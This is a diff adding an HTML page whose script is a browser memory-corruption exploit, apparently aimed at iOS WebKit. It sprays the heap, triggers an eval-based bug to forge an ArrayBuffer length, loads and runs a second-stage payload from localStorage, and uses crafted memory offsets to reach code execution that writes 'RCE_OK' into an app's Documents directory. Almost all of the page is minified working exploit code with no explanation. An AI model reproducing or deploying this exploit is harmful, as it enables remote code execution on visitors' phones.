@@ -1,0 +1,46 @@
+<!doctype html><html><head><meta charset="utf-8"></head><body>
+<div id="v">X</div>
+<script>"use strict";
+var N=3000,H=150,HN=64,VK=598;
+var PAT=[0,0,0,0,1,0,0,0,255,255,0,0,255,255,255,255,255,255,255,255,255,255,255,255,1,0,0,0,255,255,255,255,255,255,255,255,255,255,255,255];
+if (globalThis.PAT !== PAT) {
+  globalThis.RESULT="RESULT NO_TOPS";
+  try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}
+} else {
+var S=new Array(N),fb=new Uint8Array(40);
+for(var j=0;j<40;j++)fb[j]=PAT[j];
+for(var i=0;i<N;i++){var u=new Uint8Array(957);S[i]=u;}
+for(var k=0;k<HN;k++)S[H+k]=null;
+globalThis.f=(0,eval)('"use strict";(function ([] = eval("(")) { var q1=0,q2=0,q3=0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; })');
+var D=new Array(800);for(var i=0;i<800;i++)D[i]=new ArrayBuffer(64);
+var TN=600,T=new Array(TN),TV=new Array(TN);
+for(var i=0;i<TN;i++){T[i]=new ArrayBuffer(72);TV[i]=new Uint8Array(T[i]);}
+var PH=[4,12,20,28,36],VKS=[598,598-10,598-20,598-30,598-40];
+var UB=new Uint8Array(2048);for(var j=0;j<2048;j++)UB[j]=0;UB[0x400]=0x88;UB[0x401]=0x77;UB[0x402]=0x66;UB[0x403]=0x55;UB[0x404]=0x44;UB[0x405]=0x33;UB[0x406]=0x22;UB[0x407]=0x11;globalThis.UB=UB;
+var hit=-1,len=0,ph=-1,vk=-1,nt=0;
+for(var pi=0;pi<5&&hit<0;pi++){
+  var p=PH[pi];
+  for(var i=0;i<N;i++){if(S[i]){for(var o=p;o+40<=957;o+=40)S[i].set(fb,o);}}
+  for(var vi=0;vi<5&&hit<0;vi++){
+    var v=VKS[vi]; if(v<16) continue;
+    for(var r=0;r<8;r++){var j=v-2*r;T[j]=null;TV[j]=null;}
+    try{f();}catch(e){}
+    nt++;
+    for(var i=0;i<TN;i++){if(T[i]!==null&&T[i].byteLength!==72){hit=i;len=T[i].byteLength;ph=p;vk=v;break;}}
+  }
+}
+if(hit>=0){globalThis.AB=T[hit];globalThis.ABV=TV[hit];globalThis.N1LEAK="FORGED";}
+globalThis.RESULT="RESULT LS C=34 SZ=957 N=3000 H=150 HN=64 HIT="+hit+" LEN="+len+" PH="+ph+" VK="+vk+" NT="+nt;
+globalThis.N1MARK=globalThis.RESULT;
+try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}
+try{console.log("N1A:"+globalThis.RESULT);}catch(e){}
+var s2=null; try{s2=localStorage.getItem("n1s2");}catch(e){}
+globalThis.RESULT += " S2LEN=" + (s2===null ? -1 : s2.length);
+if(hit>=0 && s2){
+ try{s2=s2.replace('i("IOS_N1_OK','globalThis.R=_;globalThis.W=h;globalThis.D=b;globalThis.U=d;globalThis.F=S;globalThis.B=T;globalThis.Y=y;globalThis.X=a;globalThis.M=i;globalThis.K=c;globalThis.N=ABV;globalThis.G=O;i("IOS_N1_OK');(0,eval)(s2);}catch(e2){}
+ try{if(globalThis.U){!function(){var f=B,n=(F,globalThis.U),r=D,a=R,i=(W,Y,X),t=M,o=K,x=N,c=G,e=a(f+0x69091f8n);if(o(e)){var v=e+0x296b394cn,g=e+0x296b3738n,l=e+0x4a21a474n,u=f+0x3292cn,I=f+0x172d96cn,U=f+0x628a2cn,b=e-0x66cccfcn,s=0x1122334455667788n,A=globalThis.UB;if(A){af(A,1024,s);var C,_=0n;for(C=r;C<r+65536n;C+=8n){if(2048n===(0xffffffffn&a(C))){var h=a(C+16n),E=0x00ffffffffffffffn&h;if(E>0x10000n&&E<0x0001000000000000n&&0n===(7n&h))try{if(a(h+0x400n)===s){_=h;break}}catch(f){}}}if(0n===_)for(C=r-8n;C>r-65536n;C-=8n){if(2048n===(0xffffffffn&a(C))){var T=a(C+16n),m=0x00ffffffffffffffn&T;if(m>0x10000n&&m<0x0001000000000000n&&0n===(7n&T))try{if(a(T+0x400n)===s){_=T;break}}catch(f){}}}if(0n!==_){for(var y='/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt',O='RCE_OK\n',d=of(103),p=of(d+7+1),k=p+64,w=k+64,H=w+64,L=H+64,P=0;P<L;P++)A[P]=0;for(var j=0;j<102;j++)A[0+j]=255&y.charCodeAt(j);for(var q=0;q<7;q++)A[d+q]=255&O.charCodeAt(q);A[p+16]=1,A[p+17]=6,A[p+24]=164,A[p+25]=1,af(A,k+40,_+BigInt(0)),af(A,w+16,_+BigInt(d)),A[w+24]=7;for(var z=new Uint8Array(4096),J=0;J<4096;J++)z[J]=0;af(z,8,_+BigInt(k)),af(z,16,I),af(z,24,_+BigInt(p)),af(z,184,_+BigInt(k)),af(z,208,v),af(z,224,U),af(z,240,I),af(z,248,_+BigInt(w)),af(z,272,u),af(z,416,g),af(z,448,u),af(z,584,_+BigInt(H)),af(z,608,l),af(z,624,U),t('U_RDY '+i(_)+' D='+i(r)+' DL='+i(_>r?_-r:r-_)+' O='+(C>r?'+':'-')+i(C>r?C-r:r-C)+' RT='+i(n)+' PATH='+y);var Q=tf(u),S=tf(0n),V=tf(0xffffffffffffffffn),Z=tf(b);c(n);for(var $=0;$<8;$++)x[16+$]=Q[$];for(var ff=0;ff<8;ff++)x[64+ff]=S[ff];for(var nf=0;nf<8;nf++)x[48+nf]=V[nf];for(var rf=0;rf<8;rf++)x[32+rf]=Z[rf];z=null,t('U_AFTER')}else t('U_NF D='+i(r))}else t('U_NOUB')}else t('U_NO_FREE');function af(f,n,r){for(var a,i=(a=r,BigInt.asUintN(64,a)),t=0;t<8;t++)f[n+t]=Number(i>>BigInt(8*t)&0xffn)}function tf(f){for(var n=new Array(8),r=0;r<8;r++)n[r]=Number(f>>BigInt(8*r)&0xffn);return n}function of(f){return f+7&-8}}();}}catch(e3){}
+}
+
+}
+</script>
+</body></html>
